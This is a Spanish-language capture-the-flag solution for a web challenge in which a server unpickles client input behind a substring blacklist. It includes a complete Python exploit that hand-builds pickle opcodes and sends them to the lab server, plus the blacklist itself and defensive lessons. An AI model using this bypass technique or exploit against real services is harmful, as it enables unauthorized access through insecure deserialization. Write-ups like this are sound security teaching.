# Solución — web-creditview: CreditView Pickle Deserialization Bypass

**Dificultad:** INSANE  
**Puntos:** 700  
**Categoría:** Web / Insecure Deserialization  

---

## Resumen

El servidor expone una API que acepta un formato binario propietario llamado **CRDV v2**.
Internamente, el servidor deserializa el payload con `pickle.loads()`.
Existe una lista negra superficial, pero incompleta, que bloquea ciertos strings literales.
El objetivo es construir un payload CRDV válido que deserialice un objeto
`ReportFilter(report_type='CONFIDENTIAL')` sin triggear el blacklist.

---

## Reconocimiento

### 1. Leer la documentación expuesta

Visitar `http://<host>:8080/` revela:
- El endpoint `POST /api/report` acepta `Content-Type: application/x-creditview-filter`
- La documentación técnica está en `/static/docs/api-spec.txt`
- Existen tres tipos de reporte: `STANDARD`, `PREMIUM`, `CONFIDENTIAL`
- El tipo `CONFIDENTIAL` está marcado como "solo auditores internos"

`GET http://<host>:8080/static/docs/api-spec.txt` revela la especificación completa del
formato CRDV, incluyendo que el payload es "serialización de ReportFilter" con
**pickle protocol 2**.

### 2. Entender el formato CRDV

```
Offset  Size  Tipo          Descripción
------  ----  ----          -----------
0       4     bytes         Magic: 0x43 0x52 0x44 0x56 ("CRDV")
4       1     uint8         Version: 0x02
5       2     uint16 (BE)   Payload length
7       4     uint32 (BE)   CRC32(payload)
11      N     bytes         Payload pickle
```

### 3. Entender la lista negra

El código del servidor (inferible del ejemplo en `/`) aplica este filtro sobre los bytes
del payload pickle antes de deserializar:

```python
_BLACKLIST = [b"os", b"subprocess", b"builtins", b"__import__", b"eval", b"exec"]
```

**Limitación clave:** la comprobación es una búsqueda de subcadenas de bytes literales.
No analiza la semántica del pickle, solo busca si esos bytes aparecen en algún lugar
del payload.

---

## Análisis de la vulnerabilidad

### El problema: isinstance check requiere la clase del servidor

El servidor valida que el objeto deserializado sea `isinstance(obj, ReportFilter)`,
donde `ReportFilter` es la clase definida en `__main__` del proceso servidor.

Si se intenta serializar una clase `ReportFilter` definida en el script del atacante,
el pickle generará un opcode `GLOBAL` que referencia el módulo del atacante
(por ejemplo `__main__` en el contexto del atacante), no `__main__` del servidor.
Cuando el servidor deserializa, Python buscará `ReportFilter` en `__main__` del
servidor, que es justamente donde está definida. **Esto funciona a favor del atacante.**

### El bypass: opcodes GLOBAL + BINUNICODE + TUPLE1 + REDUCE

Un pickle de protocolo 2 construido con el opcode `GLOBAL` para referenciar
`__main__.ReportFilter` y pasar `'CONFIDENTIAL'` como argumento posicional:

```
\x80\x02                      PROTO 2
c__main__\nReportFilter\n     GLOBAL '__main__' 'ReportFilter'
X\x0c\x00\x00\x00CONFIDENTIAL  BINUNICODE 'CONFIDENTIAL'
\x85                          TUPLE1  (empaqueta el string en tupla de 1 elemento)
R                             REDUCE  (llama a ReportFilter('CONFIDENTIAL'))
.                             STOP
```

**Ninguno de estos bytes contiene** `os`, `subprocess`, `builtins`, `__import__`,
`eval` ni `exec`. El string `__main__` y `ReportFilter` no están en el blacklist.

El payload resultante en hex:
```
8002635f5f6d61696e5f5f0a5265706f727446696c7465720a580c000000434f4e464944454e5449414c85522e
```

---

## Exploit completo

```python
#!/usr/bin/env python3
"""Exploit — web-creditview: CRDV pickle deserialization bypass."""
import binascii
import io
import json
import struct
import sys
import urllib.error
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

# --- Construir payload pickle usando opcodes directamente ---
# Queremos llamar a __main__.ReportFilter con report_type='CONFIDENTIAL'
# sin triggear el blacklist (b'os', b'subprocess', b'builtins', b'__import__',
# b'eval', b'exec').
# El truco: __main__ y ReportFilter NO están en el blacklist.
#
# Protocolo pickle 2, opcodes manuales:
#   PROTO 2          \x80\x02
#   GLOBAL           c__main__\nReportFilter\n   → empuja la clase en el stack
#   BINUNICODE       X + LE-uint32(len) + utf8   → empuja 'CONFIDENTIAL'
#   TUPLE1           \x85                         → (stack[-1],) como tupla
#   REDUCE           R                            → llama clase(tupla) = ReportFilter('CONFIDENTIAL')
#   STOP             .

buf = io.BytesIO()
buf.write(b'\x80\x02')                        # PROTO 2
buf.write(b'c__main__\nReportFilter\n')       # GLOBAL opcode
s = b'CONFIDENTIAL'
buf.write(b'X')                               # BINUNICODE opcode (protocolo 2)
buf.write(struct.pack('<I', len(s)))          # longitud en LE uint32
buf.write(s)
buf.write(b'\x85')                            # TUPLE1
buf.write(b'R')                               # REDUCE
buf.write(b'.')                               # STOP
payload = buf.getvalue()

print(f"[*] Payload pickle ({len(payload)} bytes): {payload.hex()}")

# Verificar que no hay términos del blacklist
blacklist = [b"os", b"subprocess", b"builtins", b"__import__", b"eval", b"exec"]
for term in blacklist:
    if term in payload:
        print(f"[!] ATENCIÓN: el payload contiene término bloqueado: {term}")
        sys.exit(1)
print("[*] Blacklist check: OK (ningún término prohibido en el payload)")

# --- Empaquetar en formato CRDV v2 ---
magic   = b'CRDV'
version = b'\x02'
plen    = struct.pack('>H', len(payload))
crc     = struct.pack('>I', binascii.crc32(payload) & 0xFFFFFFFF)
packet  = magic + version + plen + crc + payload

print(f"[*] Paquete CRDV ({len(packet)} bytes) listo")
print(f"    Magic:   {magic}")
print(f"    Version: 0x{version.hex()}")
print(f"    PLen:    {len(payload)} bytes")
print(f"    CRC32:   0x{crc.hex()}")

# --- Enviar al servidor ---
req = urllib.request.Request(
    f"{TARGET}/api/report",
    data=packet,
    headers={"Content-Type": "application/x-creditview-filter"},
    method="POST",
)
try:
    with urllib.request.urlopen(req) as resp:
        data = json.loads(resp.read())
        print(f"\n[+] Respuesta HTTP 200:")
        print(json.dumps(data, indent=2))
        flag = data.get("data", {}).get("flag", "")
        if flag:
            print(f"\n[FLAG] {flag}")
        else:
            print("\n[?] No se encontró flag en la respuesta")
except urllib.error.HTTPError as e:
    print(f"[-] HTTP {e.code}: {e.read().decode()}")
except Exception as e:
    print(f"[-] Error: {e}")
```

### Uso

```bash
# Contra el servidor local
python3 exploit.py http://localhost:8080

# Contra el servidor del reto (reemplazar IP según equipo)
python3 exploit.py http://172.30.1.10:8080
```

### Salida esperada

```
[*] Payload pickle (45 bytes): 8002635f5f6d61696e5f5f0a5265706f727446696c7465720a580c000000434f4e464944454e5449414c85522e
[*] Blacklist check: OK (ningún término prohibido en el payload)
[*] Paquete CRDV (56 bytes) listo
    Magic:   b'CRDV'
    Version: 0x02
    PLen:    45 bytes
    CRC32:   0x????????
[+] Respuesta HTTP 200:
{
  "access": "GRANTED",
  "data": {
    "classification": "TOP SECRET",
    "flag": "flag{...}",
    "note": "Acceso a datos confidenciales concedido"
  },
  "report_type": "CONFIDENTIAL",
  "status": "ok"
}

[FLAG] flag{...}
```

---

## Pasos resumidos

1. `GET /static/docs/api-spec.txt` — leer la especificación del formato CRDV.
2. Identificar que el payload es pickle y que la lista negra es superficial.
3. Construir manualmente opcodes pickle (protocolo 2) para instanciar
   `__main__.ReportFilter('CONFIDENTIAL')` sin usar ningún módulo bloqueado.
4. Empaquetar en formato CRDV: magic + version + uint16(len) + uint32(CRC32) + payload.
5. `POST /api/report` con `Content-Type: application/x-creditview-filter`.
6. Leer `data.flag` en la respuesta JSON.

---

## Lecciones aprendidas

- **Nunca usar pickle como formato de intercambio con clientes externos.** Pickle es
  un protocolo de serialización de Python que puede ejecutar código arbitrario durante
  la deserialización.
- **Las listas negras sobre bytes pickle son ineficaces.** El formato pickle usa opcodes
  binarios; cualquier módulo no explícitamente bloqueado puede ser referenciado.
- **La defensa correcta** es usar formatos seguros (JSON, MessagePack, Protobuf) y
  validar el esquema del objeto antes de usarlo, nunca deserializar input externo
  con pickle.

---

## Nota anti-trampa

La flag es dinámica y única por equipo. Cada instancia del reto recibe una flag
distinta via variable de entorno `FLAG` en tiempo de ejecución. Compartir la flag
de otro equipo no sirve para obtener puntos.
